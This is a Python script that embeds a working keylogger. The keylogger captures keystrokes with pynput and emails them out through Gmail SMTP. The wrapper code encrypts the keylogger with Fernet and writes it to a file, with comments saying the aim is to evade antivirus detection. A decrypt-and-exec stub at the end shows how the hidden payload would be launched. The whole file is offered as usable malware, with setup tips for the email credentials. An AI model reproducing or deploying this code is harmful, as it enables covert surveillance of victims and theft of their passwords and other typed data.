from cryptography.fernet import Fernet
import sys

# This is the code. We want to encode it, so we store the string as
# bytes in order to use the cryptography module.
# Note: You may change the sender_email, receiver_email, and password
# variables in the code bellow. I strongly recommend to not use your
# personal google account because the code will not be encrypted, but
# encoded in base64. You can get the password from Google account >
# security > apps password. (in the search box).

code = b"""
from pynput import keyboard
from datetime import datetime
import logging
import ssl, smtplib

count = 0
log = ""

def send_report():
    global log
    port = 587  # For starttls
    smtp_server = "smtp.gmail.com"
    sender_email = "youremail@gmail.com"
    receiver_email = "youremail@gmail.com"
    password = "your google apps password"
    message = f'''\
    Subject: Keylogger

    {log}'''

    context = ssl.create_default_context()
    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()  # Can be omitted
            server.starttls(context=context)
            server.ehlo()  # Can be omitted
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message)
    except Exception as e:
        logging.info(f"Error ocurred while sending the email: {e}")

    return


def key_press(key):
    logging.info(str(key))
    global count
    global log
    log += str(key)
    count += 1
    if count > 50:
        return False     

def main():
    logging.basicConfig(filename="log.txt", level=logging.DEBUG)
    logging.info(f"Log begins on {datetime.now()}.")
    with keyboard.Listener(on_press=key_press) as l:
        l.join()
    logging.info("Log finished.")
    logging.info("Seding to email...")
    send_report()
    logging.info("Email sent.")

if __name__ == "__main__":
    main()
"""

# We want to encode our program in order to avoid
# antivirus detection as possible. This will not avoid
# the detection of every antivirus, but it will do it
# for a lot of them.

key = Fernet.generate_key() # Generate a key
print(key) # Copy the key as you'll need it to decode the program
encryption_type = Fernet(key) # Set the encryption (encode) type as Fernet
encrypted_message = encryption_type.encrypt(code) # Encoded code 

with open("w.txt", "wb") as f:
    f.write(encrypted_message) # Write a file with the code above but encoded

sys.exit() # Stop the execution 

# Lines bellow are what we are going to use in another file
# to decode our program. But here we just want to retrieve
# the encoded version of our program.

decrypted_message = encryption_type.decrypt(encrypted_message)
exec(decrypted_message)